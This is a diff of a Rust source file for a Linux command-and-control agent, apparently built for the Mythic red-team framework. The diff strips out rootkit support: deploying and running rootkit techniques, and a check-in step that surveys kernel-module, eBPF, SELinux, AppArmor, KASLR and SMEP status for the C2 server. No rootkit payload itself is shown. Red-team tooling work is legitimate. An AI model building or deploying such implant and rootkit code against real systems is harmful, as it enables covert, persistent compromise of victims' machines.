@@ -1,14 +1,12 @@
 use crate::payloadvars;
 use crate::tasking::Tasker;
-use crate::bridge::KernelBridge;
-use crate::rootkit::{RootkitTechnique, RootkitManager};
 use chrono::prelude::{DateTime, NaiveDate};
 use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
 use rand::Rng;
 use serde::{Deserialize, Serialize};
 use serde_json::json;
-use std::error::Error;
 use std::collections::HashMap;
+use std::error::Error;
 
 use crate::profiles::Profile;
 use crate::utils::linux as native;
@@ -102,18 +100,6 @@ pub struct EchidnaAgent {
 
     /// Tasking information for the agent
     pub tasking: Tasker,
-
-    /// Rootkit technique manager
-    rootkit_manager: RootkitManager,
-
-    /// Kernel communication bridge
-    kernel_bridge: Option<KernelBridge>,
-
-    /// Currently active rootkit technique
-    active_technique: Option<String>,
-
-    /// Technique deployment status
-    technique_status: HashMap<String, bool>,
 }
 
 impl EchidnaAgent {
@@ -133,10 +119,6 @@ impl EchidnaAgent {
             c2profile,
             tasking: Tasker::new(),
             killdate: NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d").unwrap(),
-            rootkit_manager: RootkitManager::new(),
-            kernel_bridge: None,
-            active_technique: None,
-            technique_status: HashMap::new(),
         }
     }
 
@@ -144,138 +126,10 @@ impl EchidnaAgent {
     pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
         // Get the checkin information for Linux including rootkit capability assessment
         let mut json_body = native::get_checkin_info();
-        
-        // Add rootkit-specific system information
-        let rootkit_info = self.assess_rootkit_capabilities()?;
-        if let Ok(mut checkin_data) = serde_json::from_str::<serde_json::Value>(&json_body) {
-            checkin_data["rootkit_capabilities"] = rootkit_info;
-            json_body = serde_json::to_string(&checkin_data)?;
-        }
 
         // Send the checkin information through the configured profile
         self.c2profile.initial_checkin(&json_body)?;
 
-        Ok(())
-    }
-
-    /// Assess system capabilities for different rootkit techniques
-    fn assess_rootkit_capabilities(&self) -> Result<serde_json::Value, Box<dyn Error>> {
-        let mut capabilities = json!({});
-
-        // Check for LKM support
-        capabilities["lkm_support"] = json!({
-            "kernel_modules_enabled": std::path::Path::new("/proc/modules").exists(),
-            "can_load_modules": self.check_module_loading_capability(),
-            "kernel_version": self.get_kernel_version(),
-            "has_proc_kallsyms": std::path::Path::new("/proc/kallsyms").exists(),
-        });
-
-        // Check for eBPF support (future implementation)
-        capabilities["ebpf_support"] = json!({
-            "bpf_syscall_available": self.check_bpf_support(),
-            "kernel_version_compatible": self.check_ebpf_kernel_version(),
-        });
-
-        // Check for LD_PRELOAD support (future implementation)
-        capabilities["preload_support"] = json!({
-            "ld_preload_available": true,
-            "glibc_version": self.get_glibc_version(),
-        });
-
-        // System security status
-        capabilities["security_status"] = json!({
-            "selinux_enabled": std::path::Path::new("/sys/fs/selinux").exists(),
-            "apparmor_enabled": std::path::Path::new("/sys/kernel/security/apparmor").exists(),
-            "kaslr_enabled": self.check_kaslr_status(),
-            "smep_enabled": self.check_smep_status(),
-        });
-
-        Ok(capabilities)
-    }
-
-    /// Check if kernel module loading is possible
-    fn check_module_loading_capability(&self) -> bool {
-        // Check if we can read /proc/modules and if insmod/modprobe exist
-        std::path::Path::new("/proc/modules").exists() && 
-        (std::path::Path::new("/sbin/insmod").exists() || 
-         std::path::Path::new("/usr/sbin/insmod").exists())
-    }
-
-    /// Get kernel version information
-    fn get_kernel_version(&self) -> String {
-        std::fs::read_to_string("/proc/version")
-            .unwrap_or_default()
-            .lines()
-            .next()
-            .unwrap_or("Unknown")
-            .to_string()
-    }
-
-    /// Get glibc version
-    fn get_glibc_version(&self) -> String {
-        // Try to get glibc version from ldd or other methods
-        "Unknown".to_string() // Simplified for now
-    }
-
-    /// Check KASLR (Kernel Address Space Layout Randomization) status
-    fn check_kaslr_status(&self) -> bool {
-        std::fs::read_to_string("/proc/cmdline")
-            .map(|content| !content.contains("nokaslr"))
-            .unwrap_or(true)
-    }
-
-    /// Check SMEP (Supervisor Mode Execution Prevention) status
-    fn check_smep_status(&self) -> bool {
-        std::fs::read_to_string("/proc/cpuinfo")
-            .map(|content| content.contains("smep"))
-            .unwrap_or(false)
-    }
-
-    /// Deploy a specific rootkit technique
-    pub fn deploy_rootkit(&mut self, technique: &str) -> Result<String, Box<dyn Error>> {
-        // Initialize kernel bridge if not already done
-        if self.kernel_bridge.is_none() {
-            self.kernel_bridge = Some(KernelBridge::new()?);
-        }
-
-        // Deploy the requested technique
-        let result = self.rootkit_manager.deploy_technique(
-            technique, 
-            self.kernel_bridge.as_mut().unwrap()
-        )?;
-
-        // Update status tracking
-        self.active_technique = Some(technique.to_string());
-        self.technique_status.insert(technique.to_string(), true);
-
-        Ok(result)
-    }
-
-    /// Check if a rootkit technique is currently active
-    pub fn is_technique_active(&self, technique: &str) -> bool {
-        self.technique_status.get(technique).copied().unwrap_or(false)
-    }
-
-    /// Execute a command through the active rootkit technique
-    pub fn execute_rootkit_command(&mut self, command: &str, params: &str) -> Result<String, Box<dyn Error>> {
-        if let Some(ref active) = self.active_technique {
-            self.rootkit_manager.execute_command(active, command, params)
-        } else {
-            Err("No active rootkit technique".into())
-        }
-    }
-
-    /// Clean up all rootkit techniques
-    pub fn cleanup_rootkit(&mut self) -> Result<(), Box<dyn Error>> {
-        self.rootkit_manager.cleanup_all()?;
-        
-        if let Some(ref mut bridge) = self.kernel_bridge {
-            bridge.cleanup()?;
-        }
-        
-        self.active_technique = None;
-        self.technique_status.clear();
-        
         Ok(())
     }
 
@@ -323,7 +177,7 @@ impl EchidnaAgent {
         let response: PostTaskingResponse = serde_json::from_str(&json_response)?;
 
         // Some background tasks require more information from Mythic in order to continue
-        // running (upload/download, rootkit operations). Take the response and create new tasking 
+        // running (upload/download, rootkit operations). Take the response and create new tasking
         // for passing along to already running background tasks
         let mut pending_tasks: Vec<AgentTask> = Vec::new();
         for resp in response.responses {
